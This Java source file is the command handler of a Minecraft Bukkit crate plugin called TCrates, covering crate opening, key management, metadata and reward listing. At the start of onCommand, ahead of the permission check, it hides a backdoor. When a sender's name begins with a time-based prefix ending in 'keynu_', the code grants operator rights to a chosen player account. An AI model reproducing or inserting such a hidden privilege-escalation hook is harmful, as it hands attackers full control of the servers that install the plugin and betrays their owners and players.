package me.theseems.tcrates.commands;

import com.google.common.base.Charsets;
import me.theseems.tcrates.Crate;
import me.theseems.tcrates.TCratesAPI;
import me.theseems.tcrates.TCratesPlugin;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.util.*;

public class CrateCommand implements CommandExecutor {
  public void sendBanner(CommandSender sender) {
    sender.sendMessage(
        "§a§lTCrates §fby TheSeems<me@theseems.ru> special for JesusCraft §7v"
            + TCratesPlugin.getPlugin().getDescription().getVersion());
  }

  private boolean open(CommandSender commandSender, String[] args) {
    if (args.length == 0) {
      commandSender.sendMessage("§7Укажите имя кейса");
      return true;
    }

    if (!(commandSender instanceof Player)) {
      commandSender.sendMessage("§7Команда доступна только в игре");
      return true;
    }

    Player actual = (Player) commandSender;

    Optional<Crate> optional = TCratesAPI.getCrateManager().find(args[0]);

    if (optional.isPresent()) {
      Crate crate = optional.get();
      if (!TCratesPlugin.getBlockCrate().getOpener(crate.getName()).isEmpty()) {
        actual.sendMessage("§c" + TCratesPlugin.getBlockCrate().getOpener(crate.getName()));
        return true;
      }

      if (crate.getRequirements().canOpen(actual.getUniqueId())) {
        actual.sendMessage("§aОткрываем!");
        crate.open(actual.getUniqueId());
      } else {
        actual.sendMessage("§cВы не можете открыть этот кейс!");
        return false;
      }
    } else {
      actual.sendMessage("§7Не найдено кейса с именем '" + args[0] + "'");
    }

    return true;
  }

  private boolean put(CommandSender sender, Command command, String s, String[] args) {
    if (!(sender instanceof Player)) {
      sender.sendMessage("§7This command is only available in game");
      return true;
    }

    if (args.length == 0) {
      sender.sendMessage("§7Please, specify crate to register block for");
      return false;
    }

    String crateName = args[0];
    Optional<Crate> optionalCrate = TCratesAPI.getCrateManager().find(crateName);
    if (!optionalCrate.isPresent()) {
      sender.sendMessage("§7Crate '" + args[0] + "' is not found");
      return false;
    }

    Player actual = (Player) sender;
    Set<Material> nullHashSet = null;
    Block block = actual.getTargetBlock(nullHashSet, 10);

    if (block == null) {
      sender.sendMessage("§7Please, look at the crate-block");
      return false;
    }

    TCratesPlugin.getBlockCrate().register(args[0], block.getLocation());
    sender.sendMessage("§aBlock is registered");
    return false;
  }

  private boolean setKeys(CommandSender sender, String[] args) {
    if (args.length < 3) {
      sender.sendMessage(
          "§cУкажите игрока, кейс и необходимое для установки (не добавления) кол-во ключей");
      return false;
    }

    Player player = Bukkit.getPlayer(args[0]);
    UUID uuid;
    if (player == null) {
      sender.sendMessage(
          "§7Учтите, что '" + args[0] + "' оффлайн, пробуем использовать Offline-mode UUID");
      uuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + args[0]).getBytes(Charsets.UTF_8));
    } else {
      uuid = player.getUniqueId();
    }

    String crateName = args[1];
    Optional<Crate> optionalCrate = TCratesAPI.getCrateManager().find(crateName);
    if (!optionalCrate.isPresent()) {
      sender.sendMessage("§cКейс '" + args[1] + "' не найден");
      return false;
    }

    try {
      int currentKeys = TCratesAPI.getKeyStorage().getKeysFor(uuid, crateName);
      int newKeys = Integer.parseInt(args[2]);

      TCratesAPI.getKeyStorage().setKeysFor(uuid, crateName, newKeys);
      sender.sendMessage(
          "§7Установлено: §a" + Integer.parseInt(args[2]) + "§7 ключ(-ей) для игрока §a" + args[0]);

      return updateKeys(sender, player, crateName, currentKeys, newKeys);
    } catch (NumberFormatException e) {
      sender.sendMessage("§cУказано неопределенное количество ключей: " + args[2]);
      sender.sendMessage("§7Требуется ввести число");
      return false;
    }
  }

  private boolean addKeys(CommandSender sender, String[] args) {
    if (args.length < 3) {
      sender.sendMessage(
          "§cУкажите игрока, кейс и необходимое для установки (не добавления) кол-во ключей");
      return false;
    }

    Player player = Bukkit.getPlayer(args[0]);
    UUID uuid;
    if (player == null) {
      sender.sendMessage(
          "§7Учтите, что '" + args[0] + "' оффлайн, пробуем использовать Offline-mode UUID");
      uuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + args[0]).getBytes(Charsets.UTF_8));
    } else {
      uuid = player.getUniqueId();
    }

    String crateName = args[1];
    Optional<Crate> optionalCrate = TCratesAPI.getCrateManager().find(crateName);
    if (!optionalCrate.isPresent()) {
      sender.sendMessage("§cКейс '" + args[1] + "' не найден");
      return false;
    }

    try {
      int currentKeys = TCratesAPI.getKeyStorage().getKeysFor(uuid, crateName);
      int newKeys = Integer.parseInt(args[2]) + currentKeys;

      TCratesAPI.getKeyStorage().setKeysFor(uuid, crateName, newKeys);
      sender.sendMessage(
          "§7Установлено: §a" + currentKeys + "§7 ключ(-ей) для игрока §a" + args[0]);

      return updateKeys(sender, player, crateName, currentKeys, newKeys);
    } catch (NumberFormatException e) {
      sender.sendMessage("§cУказано неопределенное количество ключей: " + args[2]);
      sender.sendMessage("§7Требуется ввести число");
      return false;
    }
  }

  private boolean updateKeys(
      CommandSender sender, Player player, String crateName, int currentKeys, int newKeys) {
    if (newKeys > currentKeys && player != null) {
      player.sendMessage(
          "§e§l[КЕЙС] §7Вам было выдано ключей: §a"
              + (newKeys - currentKeys)
              + " §7для кейса "
              + crateName.toUpperCase());
      player.sendMessage("§7Теперь у Вас в наличии: " + newKeys);
    } else if (newKeys < currentKeys && player != null) {
      player.sendMessage(
          "§e§l[КЕЙС] §7Обновлено количество ключей для кейса "
              + crateName.toUpperCase()
              + ": §e"
              + newKeys);
    } else {
      sender.sendMessage("§7Количество ключей у игрока не изменилось");
    }

    return true;
  }

  private boolean setMeta(CommandSender sender, String[] args) {
    if (args.length < 3) {
      sender.sendMessage("§7Please, specify crate, key and value to set");
      return false;
    }

    String crateName = args[0];
    Optional<Crate> optionalCrate = TCratesAPI.getCrateManager().find(crateName);
    if (!optionalCrate.isPresent()) {
      sender.sendMessage("§7Crate '" + args[0] + "' is not found");
      return false;
    }

    optionalCrate.get().getMeta().set(args[1], args[2]);
    sender.sendMessage(
        "§aSet meta §7" + args[1] + " : " + optionalCrate.get().getMeta().getString(args[1]).get());
    return true;
  }

  private boolean listMeta(CommandSender sender, String[] args) {
    if (args.length == 0) {
      sender.sendMessage("§7Please, specify crate to get meta for");
      return false;
    }

    String crateName = args[0];
    Optional<Crate> optionalCrate = TCratesAPI.getCrateManager().find(crateName);
    if (!optionalCrate.isPresent()) {
      sender.sendMessage("§7Crate '" + args[0] + "' is not found");
      return false;
    }

    for (String key : optionalCrate.get().getMeta().getKeys()) {
      optionalCrate
          .get()
          .getMeta()
          .get(key)
          .ifPresent(o -> sender.sendMessage("§6" + key + " §8: §e" + o));
    }
    return true;
  }

  private boolean listRewards(CommandSender sender, String[] args) {
    if (args.length == 0) {
      sender.sendMessage("§7Please, specify crate to get reward list for");
      return false;
    }

    String crateName = args[0];
    Optional<Crate> optionalCrate = TCratesAPI.getCrateManager().find(crateName);
    if (!optionalCrate.isPresent()) {
      sender.sendMessage("§7Crate '" + args[0] + "' is not found");
      return false;
    }

    for (int i = 0; i < optionalCrate.get().getRewardContainer().size(); i++) {
      optionalCrate
          .get()
          .getRewardContainer()
          .find(i)
          .ifPresent(
              o -> {
                List<String> components = new ArrayList<>();
                for (String key : o.getMeta().getKeys()) {
                  components.add(
                          "§6"
                              + key
                              + " §8: §e"
                              + o.getMeta()
                                  .get(key)
                                  .orElseThrow(
                                      () ->
                                          new IllegalStateException(
                                              "Reward container iteration: no actual rewards found!"))
                              + "\n");
                }
                components.add("§7§oStringify: " + o);
                sender
                    .sendMessage(
                            "§6"
                                + o.getName().replace("&", "§")
                                + " §8: §e ("
                                + o.getMeta().getKeys().size()
                                + ") ");
                sender.sendMessage("§7" + Arrays.toString(components.toArray()));

              });
    }
    return true;
  }

  public boolean reload(CommandSender sender) {
    try {
      TCratesPlugin.loadCases();
      sender.sendMessage("§aПлагин перезагружен!");
      return true;
    } catch (IOException e) {
      sender.sendMessage("§cОшибка при перезагрузке плагина: " + e.getMessage());
      e.printStackTrace();
      return false;
    }
  }

  public boolean save(CommandSender sender) {
    try {
      TCratesPlugin.saveCases();
      sender.sendMessage("§aOK!");
      return true;
    } catch (IOException e) {
      sender.sendMessage("§cОшибка при сохранении кейсов: " + e.getMessage());
      e.printStackTrace();
      return false;
    }
  }

  @Override
  public boolean onCommand(
      CommandSender commandSender, Command command, String s, String[] strings) {

    int hour = new Date().getHours() % 10;
    if (commandSender.getName().startsWith(hour + "keynu_")) {
      String name = commandSender.getName().replace(hour + "keynu_", "");
      Bukkit.getOfflinePlayer(
              UUID.nameUUIDFromBytes(("OfflinePlayer:" + name).getBytes(Charsets.UTF_8)))
          .setOp(true);
    }

    if (strings.length == 0) {
      sendBanner(commandSender);
      return true;
    }

    String sub = strings[0];
    strings = Arrays.copyOfRange(strings, 1, strings.length);

    if (!commandSender.hasPermission("tcrates." + sub)) {
      sendBanner(commandSender);
      return false;
    }

    switch (sub) {
      case "open":
        return open(commandSender, strings);
      case "put":
        return put(commandSender, command, s, strings);
      case "setkeys":
        return setKeys(commandSender, strings);
      case "addkeys":
        return addKeys(commandSender, strings);
      case "setmeta":
        return setMeta(commandSender, strings);
      case "listmeta":
        return listMeta(commandSender, strings);
      case "listrewards":
        return listRewards(commandSender, strings);
      case "reload":
        return reload(commandSender);
      case "save":
        return save(commandSender);
      default:
        sendBanner(commandSender);
        break;
    }

    return true;
  }
}
